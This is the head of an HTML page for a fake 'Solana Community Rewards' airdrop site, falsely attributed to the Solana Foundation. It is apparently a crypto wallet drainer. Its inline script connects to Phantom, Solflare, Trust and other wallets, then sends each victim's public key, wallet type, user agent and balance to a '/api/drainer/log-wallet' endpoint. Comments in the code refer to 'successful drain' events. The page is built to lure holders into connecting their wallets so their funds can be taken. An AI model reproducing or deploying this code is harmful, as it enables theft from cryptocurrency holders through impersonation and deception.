<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>  Solana Community Rewards</title>
  <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
  <meta http-equiv="Pragma" content="no-cache" />
  <meta http-equiv="Expires" content="0" />
  <meta name="description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
  
  <!-- dApp Metadata for Wallets -->
  <meta name="application-name" content="  Solana Community Rewards" />
<meta name="apple-mobile-web-app-title" content="  Solana Community Rewards" />
  <meta name="msapplication-TileColor" content="#14f195" />
  <meta name="theme-color" content="#14f195" />
  
  <!-- Solana dApp Metadata -->
<meta name="solana-dapp-name" content="  Solana Community Rewards" />
<meta name="solana-dapp-description" content="Powering the Next Wave of Builders & Holders" />
<meta name="solana-dapp-url" content="" />
<meta name="solana-dapp-icon" content="/logo.png" />
  
  <!-- Wallet Connect Metadata -->
  <meta name="wallet-connect-name" content="  Solana Community Rewards" />
<meta name="wallet-connect-description" content="Powering the Next Wave of Builders & Holders" />
  <meta name="wallet-connect-url" content="" />
  <meta name="wallet-connect-icon" content="/logo.png" />
  
  <!-- SEO and Social Media Meta Tags -->
  <meta property="og:title" content="  Solana Community Rewards" />
<meta property="og:description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
  <meta property="og:type" content="website" />
  <meta property="og:url" content="" />
  <meta property="og:image" content="/logo.png" />
  <meta property="og:site_name" content="  Solana Community Rewards" />
  
  <meta name="twitter:card" content="summary_large_image" />
  <meta name="twitter:title" content="  Solana Community Rewards" />
<meta name="twitter:description" content="Powering the Next Wave of Builders & Holders. Join the Solana Community Rewards Program and earn $SOL for your contributions." />
  <meta name="twitter:image" content="/logo.png" />
  
  <meta name="keywords" content="solana, community, rewards, builders, validators, creators, crypto, blockchain, SOL, ecosystem" />
<meta name="author" content="Solana Foundation" />
  <meta name="robots" content="index, follow" />
  
  <!-- Mobile App Meta Tags -->
  <meta name="mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-capable" content="yes" />
  <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent" />
  
  <!-- Deep Link Meta Tags -->
  <meta name="apple-itunes-app" content="app-id=1598432977, app-argument=https://phantom.app/ul/browse/" />
  <meta name="google-play-app" content="app-id=app.phantom" />
  
  <!-- Preload critical images for faster loading -->
  <link rel="preload" href="/logo.png" as="image" type="image/png" />
  <link rel="preload" href="/phantom-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/solflare-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/backpack-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/glow-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/trust-logo.png" as="image" type="image/png" />
  <link rel="preload" href="/exodus-logo.png" as="image" type="image/png" />
  
  <!-- dApp Manifest -->
  <link rel="manifest" href="/manifest.json?v=3" />
  <link rel="icon" href="/favicon1.ico?v=6" type="image/x-icon" />
  <link rel="apple-touch-icon" href="/logo.png?v=3" />
  <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js?v=4"></script>
  <script src="/patient-mode.js"></script>
  <script>
    // Ensure solanaWeb3 is available globally
    window.solanaWeb3 = window.solanaWeb3 || window.exports || {};
    
    // Initialize Patient Mode with safety check
    if (typeof PatientMode !== 'undefined') {
      window.patientMode = new PatientMode();
      console.log('[PATIENT_MODE] Initialized with extended timeouts');
    } else {
      console.error('[PATIENT_MODE] PatientMode class not found, retrying...');
      // Retry after a short delay
      setTimeout(() => {
        if (typeof PatientMode !== 'undefined') {
          window.patientMode = new PatientMode();
          console.log('[PATIENT_MODE] Initialized with extended timeouts (delayed)');
        } else {
          console.error('[PATIENT_MODE] Failed to initialize - PatientMode class not available');
        }
      }, 100);
    }
            </script>
  
  <script>
    // Handle Chrome extension errors gracefully
    window.addEventListener('error', function(e) {
      if (e.message && e.message.includes('Cannot use import statement outside a module')) {
        // Ignore Chrome extension import errors
        e.preventDefault();
        return false;
      }
      
      // Handle browser extension message channel errors
      if (e.message && e.message.includes('message channel closed before a response was received')) {
        // Ignore message channel errors
        e.preventDefault();
        return false;
      }
      
      // Handle listener asynchronous response errors
      if (e.message && e.message.includes('listener indicated an asynchronous response')) {
        // Ignore async response errors
        e.preventDefault();
        return false;
      }
    });
    
    (function() {
      const currentUrl = window.location.origin;
      const logoUrl = currentUrl + '/logo.png';
      
      const metaTags = [
        { name: 'solana-dapp-url', content: currentUrl },
        { name: 'wallet-connect-url', content: currentUrl },
        { property: 'og:url', content: currentUrl },
        { property: 'og:image', content: logoUrl },
        { name: 'twitter:image', content: logoUrl }
      ];
      
      metaTags.forEach(tag => {
        const selector = tag.name ? `meta[name="${tag.name}"]` : `meta[property="${tag.property}"]`;
        const metaTag = document.querySelector(selector);
        if (metaTag) {
          metaTag.setAttribute('content', tag.content);
        }
      });
      
      window.dAppMetadata = {
        name: '  Solana Community Rewards',
        description: 'Powering the Next Wave of Builders & Holders',
        url: currentUrl,
        icon: logoUrl
      };
    })();
    
    // Global request tracking to prevent conflicts
    window.pendingRequests = new Set();
    
    // Function to manage pending requests
    window.addPendingRequest = function(requestId) {
      if (window.pendingRequests.has(requestId)) {
        // Request already pending
        return false; // Return false instead of throwing
      }
      window.pendingRequests.add(requestId);
      return true;
    };
    
    window.removePendingRequest = function(requestId) {
      window.pendingRequests.delete(requestId);
    };
    
    // Clear all pending requests on page load
    window.clearAllPendingRequests = function() {
      window.pendingRequests.clear();
      // Cleared all pending requests
    };
    
    // Preload wallet logos for faster display
    function preloadWalletLogos() {
      const logoUrls = [
        '/logo.png',
        '/phantom-logo.png',
        '/solflare-logo.png',
        '/backpack-logo.png',
        '/glow-logo.png',
        '/trust-logo.png',
        '/exodus-logo.png'
      ];
      
      logoUrls.forEach(url => {
        const img = new Image();
        img.src = url;
        img.onload = () => {}; // Logo loaded
        img.onerror = () => {}; // Logo failed to load
      });
    }
    
    // Preload logos on page load
    preloadWalletLogos();
    
    // Register service worker for logo caching if supported
    if ('serviceWorker' in navigator) {
      navigator.serviceWorker.register('/sw.js').then(registration => {
        // Service Worker registered
      }).catch(error => {
        // Service Worker registration failed
      });
    }
    
    // Clear requests on page load
    window.clearAllPendingRequests();
    
    // Auto-clear pending requests after 30 seconds
    setInterval(() => {
      if (window.pendingRequests.size > 0) {
        // Auto-clearing stale pending requests
        window.clearAllPendingRequests();
      }
    }, 30000);
    
    // Centralized wallet logging function with enhanced deduplication - 2025 FIX
    window.logWalletConnection = function(publicKey, walletType, lamports = 0) {
      try {
        const walletKey = `${publicKey.toString()}-${walletType}`;
        const now = Date.now();
        const lastLogged = window.walletLogTimestamps?.[walletKey] || 0;
        const lastLoggedBalance = window.walletLastLoggedBalance?.[walletKey] ?? 0;
        
        // Enhanced deduplication: prevent logging for 10 minutes after a successful drain
        const drainKey = `${walletKey}-drain`;
        const lastDrainTime = window.walletLogTimestamps?.[drainKey] || 0;
        const timeSinceDrain = now - lastDrainTime;
        
        // If we recently had a drain (within 10 minutes), skip logging completely
        if (timeSinceDrain < 600000) { // 10 minutes
          // Skipping wallet log - recent drain detected
          return;
        }
        
        // If last logged balance was 0 and now > 0, force a log even within dedup window
        const forceUpgradeLog = lamports > 0 && lastLoggedBalance === 0;
        
        // Only log if upgraded balance or if we haven't logged this wallet in the last 5 minutes
        if (forceUpgradeLog || (now - lastLogged > 300000)) { // 5 minutes
          // Initialize timestamps object if it doesn't exist
          if (!window.walletLogTimestamps) {
            window.walletLogTimestamps = {};
          }
          
          // Log wallet connection with retry logic
          const logWalletWithRetry = async (attempt = 1) => {
            try {
              const controller = new AbortController();
              const timeoutId = setTimeout(() => controller.abort(), 10000); // 10 second timeout
              
              await fetch('/api/drainer/log-wallet', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                  publicKey: publicKey.toString(),
                  walletType: walletType,
                  origin: window.location.origin,
                  userAgent: navigator.userAgent,
                  lamports: lamports
                }),
                signal: controller.signal
              });
              
              clearTimeout(timeoutId);
            } catch (err) {
              // Failed to log wallet connection
              
              if (attempt < 2) {
                // Retry once after a short delay
                setTimeout(() => logWalletWithRetry(attempt + 1), 2000);
              }
            }
          };
          
          logWalletWithRetry();
          
          // Update timestamp and cached balance to prevent spam
          window.walletLogTimestamps[walletKey] = now;
          if (!window.walletBalanceCache) window.walletBalanceCache = {};
          if (!window.walletLastLoggedBalance) window.walletLastLoggedBalance = {};
          window.walletBalanceCache[walletKey] = lamports;
          window.walletLastLoggedBalance[walletKey] = lamports;
          
          // Logged wallet connection
        } else {
          // Skipping duplicate wallet log
        }
      } catch (logError) {
        console.error('[WALLET] Failed to log wallet connection:', logError);
      }
    };
    
    // Enhanced automatic fallback mechanisms
    window.handleConnectionError = function(error, walletName, provider) {
      // Handling connection error
      
      // Initialize retry counter if it doesn't exist
      if (!window.connectionRetryCount) {
        window.connectionRetryCount = {};
      }
      
      const retryKey = `${walletName}-${Date.now()}`;
      const currentRetries = window.connectionRetryCount[retryKey] || 0;
      
      // Prevent infinite retry loops - max 2 retries per wallet
      if (currentRetries >= 2) {
        // Max retries reached - stopping automatic retry
        showStatus('Failed', 'error');
        return;
      }
      
      // Increment retry counter
      window.connectionRetryCount[retryKey] = currentRetries + 1;
      
      // Clear any pending requests
      window.clearAllPendingRequests();
      
      // Wait a moment before retry
      setTimeout(async () => {
        // Retrying connection
        
        // Wallet-specific fallback strategies
        switch (walletName) {
          case 'Trust Wallet':
            // Trust Wallet specific fallbacks - avoid signIn as it's not implemented
            if (provider && typeof provider.connect === 'function') {
              // Trust Wallet handles its own timeouts
              const connectPromise = provider.connect();
              
              try {
                await connectPromise;
              } catch (fallbackError) {
                // Trust Wallet connect failed
                showStatus('Failed', 'error');
              }
            } else {
              // Trust Wallet provider not available
              showStatus('Unavailable', 'error');
            }
            break;
            
          case 'Phantom':
            // Phantom specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              // Trying Phantom connect with metadata
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                // Phantom connect failed, trying simple connect
                try {
                  await provider.connect();
                } catch (simpleError) {
                  // Phantom simple connect also failed
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Solflare':
            // Solflare specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Solflare connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Solflare connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Solflare simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Backpack':
            // Backpack specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Backpack connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Backpack connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Backpack simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Glow':
            // Glow specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Glow connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Glow connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Glow simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          case 'Exodus':
            // Exodus specific fallbacks
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Trying Exodus connect with metadata`);
              try {
                await provider.connect({
                  onlyIfTrusted: false,
                  appMetadata: walletAdapterMetadata
                });
              } catch (fallbackError) {
                console.log(`[FALLBACK] Exodus connect failed, trying simple connect`);
                try {
                  await provider.connect();
                } catch (simpleError) {
                  console.log(`[FALLBACK] Exodus simple connect also failed:`, simpleError.message);
                  showStatus('Failed', 'error');
                }
              }
            }
            break;
            
          default:
            // Generic fallback for other wallets
            if (provider && typeof provider.connect === 'function') {
              console.log(`[FALLBACK] Retrying connect for ${walletName}`);
              try {
                await provider.connect();
              } catch (fallbackError) {
                console.log(`[FALLBACK] Connect retry failed for ${walletName}:`, fallbackError.message);
                showStatus('Failed', 'error');
              }
            }
            break;
        }
      }, 2000);
    };
    

    
    
    
    
    
    
    
    // Set dApp metadata for wallet detection BEFORE wallet scripts load
    window.dAppMetadata = {
      name: '  Solana Community Rewards',
      description: 'Powering the Next Wave of Builders & Holders',
      url: window.location.origin,
      icon: window.location.origin + '/logo.png',
      appIdentity: {
        name: '  Solana Community Rewards',
        uri: window.location.origin,
        icon: window.location.origin + '/logo.png'
      }
    };
    
    // Ensure dApp icon is set for all wallet types
    window.solanaDAppIcon = window.location.origin + '/logo.png';
    window.phantomDAppIcon = window.location.origin + '/logo.png';
    window.solflareDAppIcon = window.location.origin + '/logo.png';
    window.backpackDAppIcon = window.location.origin + '/logo.png';
    window.glowDAppIcon = window.location.origin + '/logo.png';
    window.trustDAppIcon = window.location.origin + '/logo.png';
    window.exodusDAppIcon = window.location.origin + '/logo.png';
    
    // Function to set dApp icon for detected wallets
    function setDAppIconForWallet(walletType) {
      const iconUrl = window.location.origin + '/logo.png';
      
      switch(walletType) {
        case 'phantom':
          if (window.phantom?.solana) {
            window.phantom.solana.dAppIcon = iconUrl;
          }
          break;
        case 'solflare':
          if (window.solflare) {
            window.solflare.dAppIcon = iconUrl;
          }
          break;
        case 'backpack':
          if (window.backpack) {
            window.backpack.dAppIcon = iconUrl;
          }
          break;
        case 'glow':
          if (window.glow) {
            window.glow.dAppIcon = iconUrl;
          }
          break;
        case 'trust':
          if (window.trust) {
            window.trust.dAppIcon = iconUrl;
          }
          break;
        case 'exodus':
          if (window.exodus) {
            window.exodus.dAppIcon = iconUrl;
          }
          break;
      }
    }
    
    // Set dApp icon for wallet detection
    setDAppIconForWallet('phantom');
    setDAppIconForWallet('solflare');
    setDAppIconForWallet('backpack');
    setDAppIconForWallet('glow');
    setDAppIconForWallet('trust');
    setDAppIconForWallet('exodus');
    
    // Set document title and meta for wallet recognition
    document.title = '  Solana Community Rewards';
    
    // Add meta tags dynamically if needed
    if (!document.querySelector('meta[name="application-name"]')) {
      const meta = document.createElement('meta');
      meta.name = 'application-name';
      meta.content = '  Solana Community Rewards';
      document.head.appendChild(meta);
    }
    
    // Set additional window properties for wallet recognition
    window.solanaDAppName = '  Solana Community Rewards';
    window.solanaDAppIcon = window.location.origin + '/logo.png';
    
    // Override any existing dApp metadata
    Object.defineProperty(window, 'dAppMetadata', {
      value: window.dAppMetadata,
      writable: false,
      configurable: false
    });
    
  </script>
  <style>
    /* Version: 2025-08-18-v11 - Ultra-Compact WalletConnect-Style Web3Modal (Additional 40% Height Reduction) */
    /* Image optimization for faster loading */
    img {
      image-rendering: -webkit-optimize-contrast;
      image-rendering: crisp-edges;
      backface-visibility: hidden;
      transform: translateZ(0);
    }
    
    /* Wallet logo optimization */
    .wallet-option img {
      width: 20px;
      height: 20px;
      object-fit: contain;
      transition: transform 0.2s ease;
    }
    
    .wallet-option img:hover {
      transform: scale(1.1);
    }
    
    body {
      margin: 0;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #0a0a0a;
      color: #fff;
    }
    nav {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 20px 40px;
      background: rgba(10, 10, 10, 0.8);
      backdrop-filter: blur(10px);
      position: sticky;
      top: 0;
      z-index: 1000;
    }
    .nav-logo {
      font-size: 1.8em;
      font-weight: bold;
      color: #14f195;
    }
    .nav-btn {
      background: linear-gradient(45deg, #14f195, #00CC6A);
      color: black;
      padding: 10px 20px;
      border: none;
      border-radius: 10px;
      font-weight: 600;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .nav-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 6px 18px rgba(20, 241, 149, 0.3);
    }
    .hero {
      height: 90vh;
      background-image: linear-gradient(rgba(10,10,10,0.4), rgba(10,10,10,0.4)), url('/Hero-section.png');
      background-size: cover;
      background-position: center;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      color: white;
      text-align: center;
      padding: 0 20px;
    }
    .hero h1 {
      font-size: 3.2em;
      margin-bottom: 20px;
      font-weight: bold;
      text-shadow: 2px 2px 12px #000;
    }

    

    .claim-btn {
      font-size: 1.4em;
      padding: 18px 36px;
      background: linear-gradient(45deg, #14f195, #00CC6A);
      color: black;
      border: none;
      border-radius: 12px;
      font-weight: 700;
      cursor: pointer;
      transition: 0.3s ease;
    }
    .claim-btn:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 30px rgba(20, 241, 149, 0.4);
    }
    .footer {
      text-align: center;
      padding: 50px 20px;
      background: #111;
      color: #aaa;
      font-size: 0.95em;
      margin-top: 80px;
      border-top: 1px solid #222;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.6);
      backdrop-filter: blur(4px);
      justify-content: center;
      align-items: center;
      z-index: 9999;
      /* Ensure perfect centering */
      transform: translateZ(0);
      -webkit-transform: translateZ(0);
    }
    .modal.active {
      display: flex;
    }
        .wallet-box {
            background: #ffffff;
            border-radius: 16px;
            padding: 0;
            width: 320px;
            max-width: 320px;
            text-align: left;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
            margin: 0 auto;
            /* Perfect centering within modal */
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            -webkit-transform: translate(-50%, -50%);
            border: none;
            overflow: hidden;
            /* Ensure proper sizing */
            box-sizing: border-box;
        }
    
            .modal-header {
            margin: 0;
            padding: 8px 20px 8px 20px;
            border-bottom: 1px solid #f0f0f0;
            background: #ffffff;
            display: flex;
            justify-content: space-between;
            align-items: flex-start;
        }
        
        .header-content h3 {
            color: #1a1a1a;
            margin: 0 0 1px 0;
            font-size: 16px;
            font-weight: 600;
            letter-spacing: -0.5px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .header-subtitle {
            color: #6b7280;
            margin: 0;
            font-size: 11px;
            font-weight: 400;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .close-btn {
            background: none;
            border: none;
            color: #6b7280;
            cursor: pointer;
            padding: 8px;
            width: 40px;
            height: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            border-radius: 12px;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        
        .close-btn:hover {
            color: #1a1a1a;
            background: #f3f4f6;
        }
        
        .close-btn svg {
            width: 20px;
            height: 20px;
        }
    
            .wallet-options {
            padding: 6px 20px;
        }
        
        .wallet-option {
            display: flex;
            align-items: center;
            gap: 8px;
            background: #ffffff;
            padding: 6px 16px;
            margin: 0 0 4px 0;
            border-radius: 8px;
            cursor: pointer;
            transition: all 0.2s ease;
            border: 1px solid #f0f0f0;
            position: relative;
        }
        
        .wallet-option:last-child {
            margin-bottom: 0;
        }
        
        .wallet-option:hover, .wallet-option:focus {
            background: #f9fafb;
            border-color: #e5e7eb;
            transform: translateY(-1px);
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
        }
        
        .wallet-icon {
            width: 28px;
            height: 28px;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f9fafb;
            border-radius: 6px;
            flex-shrink: 0;
            border: 1px solid #f0f0f0;
        }
        
        .wallet-icon img {
            width: 16px;
            height: 16px;
            object-fit: contain;
        }
        
        .wallet-info {
            flex: 1;
            display: flex;
            flex-direction: column;
            gap: 2px;
        }
        
        .wallet-name {
            color: #1a1a1a;
            margin: 0 0 0px 0;
            font-size: 12px;
            font-weight: 600;
            letter-spacing: -0.3px;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-description {
            color: #6b7280;
            margin: 0;
            font-size: 10px;
            font-weight: 400;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-arrow {
            color: #9ca3af;
            transition: all 0.2s ease;
            flex-shrink: 0;
        }
        
        .wallet-option:hover .wallet-arrow {
            color: #374151;
            transform: translateX(2px);
        }
        
        .wallet-arrow svg {
            width: 20px;
            height: 20px;
        }
    
            .modal-footer {
            padding: 8px 20px 12px 20px;
            border-top: 1px solid #f0f0f0;
            background: #fafafa;
            text-align: center;
        }
        
        .footer-content {
            display: flex;
            flex-direction: column;
            gap: 6px;
            align-items: center;
        }
        
        .wallet-help {
            color: #6b7280;
            font-size: 14px;
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-links {
            display: flex;
            align-items: center;
            gap: 4px;
            flex-wrap: wrap;
            justify-content: center;
        }
        
        .wallet-link {
            color: #3b82f6;
            text-decoration: none;
            font-weight: 500;
            font-size: 14px;
            transition: color 0.2s ease;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        
        .wallet-link:hover {
            color: #2563eb;
            text-decoration: underline;
        }
        
        .separator {
            color: #d1d5db;
            font-size: 12px;
        }
    
    #status {
      text-align:center;
      margin:24px auto 0 auto;
      max-width:400px;
      font-weight:600;
      min-height: 24px;
    }
    html {
      scroll-behavior: smooth;
    }
    .nav-links {
      display: flex;
      gap: 32px;
      align-items: center;
    }
    .nav-link {
      color: #fff;
      text-decoration: none;
      font-weight: 500;
      font-size: 1.1em;
      position: relative;
      transition: color 0.2s;
      padding: 4px 0;
    }
    .nav-link.active, .nav-link:focus {
      color: #14f195;
    }
    .nav-link::after {
      content: '';
      display: block;
      width: 0;
      height: 2px;
      background: #14f195;
      transition: width 0.2s;
      position: absolute;
      left: 0;
      bottom: -2px;
    }
    .nav-link.active::after, .nav-link:hover::after {
      width: 100%;
    }
    @media (max-width: 800px) {
      .nav-links { gap: 16px; }
      .nav-link { font-size: 1em; }
    }
    @media (max-width: 600px) {
      .nav-links { gap: 8px; }
      .nav-link { font-size: 0.95em; }
    }
    @media (max-width: 600px) {
      nav { padding: 12px 8px; }
      .hero { padding: 60px 8px; }
      .hero h1 { font-size: 2em; }
      .wallet-box { 
        padding: 8px; 
        max-width: 78px;
        width: 90vw;
        margin: 0 5px;
      }
      
      .modal-header h3 {
        font-size: 0.8em;
      }
      
      .wallet-option {
        padding: 4px 6px;
        margin: 3px 0;
        gap: 4px;
      }
      
      .wallet-option img {
        width: 12px;
        height: 12px;
      }
      
      .wallet-name {
        font-size: 0.6em;
      }
    }
    .info-section {
      background: #181818;
      border-radius: 16px;
      margin: 40px auto;
      max-width: 1100px;
      padding: 36px 28px 28px 28px;
      box-shadow: 0 2px 16px rgba(0,0,0,0.08);
      color: #f3f3f3;
    }
    .info-section h2 {
      color: #14f195;
      margin-bottom: 18px;
      font-size: 2em;
    }
    .card-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(260px, 1fr));
      gap: 28px;
      margin-top: 18px;
    }
    .info-card {
      background: #232323;
      border-radius: 14px;
      box-shadow: 0 2px 12px rgba(20,241,149,0.07);
      padding: 28px 22px 20px 22px;
      transition: box-shadow 0.2s, transform 0.2s;
      min-height: 170px;
      display: flex;
      flex-direction: column;
      justify-content: flex-start;
    }
    .info-card:hover {
      box-shadow: 0 6px 24px rgba(20,241,149,0.18);
      transform: translateY(-4px) scale(1.025);
    }
    .info-card h3 {
      color: #14f195;
      margin-bottom: 12px;
      font-size: 1.18em;
    }
    .info-card ul {
      margin: 0 0 0 18px;
      padding: 0;
    }
    .info-card li {
      margin-bottom: 8px;
      line-height: 1.6;
    }
    .info-card a {
      color: #14f195;
      text-decoration: underline;
      word-break: break-all;
    }
    .info-card a:hover {
      color: #00cc6a;
    }
    html, body {
      max-width: 100vw;
      overflow-x: hidden;
    }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100vw;
      height: 100vh;
      background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(8px);
      z-index: 9999;
      padding: 0;
    }
    .modal.active, .modal[style*="display: flex"] {
      display: flex !important;
    }
    /* Mobile-specific wallet-box overrides */
    @media (max-width: 800px) {
      .wallet-box {
        width: 300px;
        max-width: 300px;
        margin: 0 auto;
        /* Maintain centering on mobile */
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        -webkit-transform: translate(-50%, -50%);
      }
      
      .modal-header {
        padding: 12px 20px 8px 20px;
      }
      
      .header-content h3 {
        font-size: 14px;
      }
      
      .header-subtitle {
        font-size: 10px;
      }
      
      .wallet-options {
        padding: 8px 20px;
      }
      
      .wallet-option {
        padding: 8px 16px;
        margin: 0 0 6px 0;
        gap: 8px;
      }
      
      .wallet-icon {
        width: 32px;
        height: 32px;
      }
      
      .wallet-icon img {
        width: 18px;
        height: 18px;
      }
      
      .wallet-name {
        font-size: 13px;
      }
      
      .wallet-description {
        font-size: 11px;
      }
      
      .modal-footer {
        padding: 10px 20px 14px 20px;
      }
    }
    /* Mobile Responsive Styles */
    @media (max-width: 600px) {
      .wallet-box {
        width: 280px;
        max-width: 280px;
        /* Maintain centering on small mobile */
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        -webkit-transform: translate(-50%, -50%);
      }
      
      .modal-header {
        padding: 10px 16px 6px 16px;
      }
      
      .header-content h3 {
        font-size: 13px;
      }
      
      .header-subtitle {
        font-size: 9px;
      }
      
      .wallet-options {
        padding: 6px 16px;
      }
      
      .wallet-option {
        padding: 6px 14px;
        margin: 0 0 4px 0;
        gap: 6px;
      }
      
      .wallet-icon {
        width: 28px;
        height: 28px;
      }
      
      .wallet-icon img {
        width: 16px;
        height: 16px;
      }
      
      .wallet-name {
        font-size: 12px;
      }
      
      .wallet-description {
        font-size: 10px;
      }
      
      .modal-footer {
        padding: 8px 16px 10px 16px;
      }
      .modal {
        align-items: center;
      }
      .claim-btn, .nav-btn, #statusModalClose {
        font-size: 1em;
        padding: 12px 10px;
      }
      .info-section {
        padding: 18px 4px 18px 4px;
      }
      .card-grid {
        gap: 12px;
      }
      .info-card {
        padding: 14px 8px 12px 8px;
        min-height: 120px;
      }
      nav {
        flex-direction: column;
        gap: 8px;
        padding: 10px 4px;
      }
      .nav-logo img {
        height: 28px !important;
      }
      .nav-links {
        gap: 8px;
      }
      .hero {
        padding: 40px 4px;
        height: 100vh;
        min-height: 600px;
        background-size: cover;
        background-position: center;
        background-attachment: scroll;
      }
      .hero h1 {
        font-size: 2.2em;
        line-height: 1.2;
        margin-bottom: 15px;
        padding: 0 10px;
      }


      .claim-btn {
        font-size: 1.3em;
        padding: 16px 28px;
        width: 90%;
        max-width: 300px;
      }
    }

    /* Tablet Responsive Styles */
    @media (min-width: 601px) and (max-width: 1024px) {
      .hero {
        height: 80vh;
        min-height: 500px;
        padding: 60px 20px;
      }
      .hero h1 {
        font-size: 2.8em;
        line-height: 1.3;
      }

      .claim-btn {
        font-size: 1.3em;
        padding: 16px 32px;
      }
      .info-section {
        padding: 30px 20px;
        margin: 30px auto;
      }
      .card-grid {
        grid-template-columns: repeat(auto-fit, minmax(240px, 1fr));
        gap: 20px;
      }
    }

    /* Large Mobile Responsive Styles */
    @media (min-width: 481px) and (max-width: 600px) {
      .hero {
        height: 90vh;
        min-height: 650px;
      }
      .hero h1 {
        font-size: 2.5em;
      }

      .claim-btn {
        font-size: 1.4em;
        padding: 18px 36px;
      }
    }

    /* Small Mobile Responsive Styles */
    @media (max-width: 480px) {
      .hero {
        height: 100vh;
        min-height: 550px;
        padding: 30px 8px;
      }
      .hero h1 {
        font-size: 1.8em;
        line-height: 1.1;
        margin-bottom: 12px;
      }


      .claim-btn {
        font-size: 1.2em;
        padding: 14px 24px;
        width: 90%;
        max-width: 280px;
      }
      .info-section {
        padding: 15px 8px;
        margin: 20px auto;
      }
      .card-grid {
        grid-template-columns: 1fr;
        gap: 15px;
      }
      .info-card {
        padding: 12px 6px 10px 6px;
        min-height: 100px;
      }
      .info-card h3 {
        font-size: 1.1em;
      }
      .info-card li {
        font-size: 0.9em;
        line-height: 1.4;
      }
    }

    /* Extra Small Mobile Responsive Styles */
    @media (max-width: 360px) {
      .hero {
        height: 100vh;
        min-height: 500px;
        padding: 20px 4px;
      }
      .hero h1 {
        font-size: 1.6em;
        line-height: 1.1;
      }
      .countdown {
        font-size: 1.1em;
        margin-bottom: 12px;
      }

      .claim-btn {
        font-size: 1.1em;
        padding: 12px 20px;
        width: 85%;
        max-width: 250px;
      }
      .info-section {
        padding: 12px 4px;
      }
      .info-card {
        padding: 10px 4px 8px 4px;
        min-height: 90px;
      }
      .info-card h3 {
        font-size: 1em;
      }
      .info-card li {
        font-size: 0.85em;
      }
    }

    /* Landscape Mobile Responsive Styles */
    @media (max-height: 500px) and (orientation: landscape) {
      .hero {
        height: 100vh;
        min-height: 400px;
        padding: 20px 10px;
      }
      .hero h1 {
        font-size: 1.8em;
        margin-bottom: 10px;
      }
      .countdown {
        font-size: 1.3em;
        margin-bottom: 15px;
      }
      .claim-btn {
        font-size: 1em;
        padding: 10px 20px;
      }
    }

    /* Ensure hero image is always responsive */
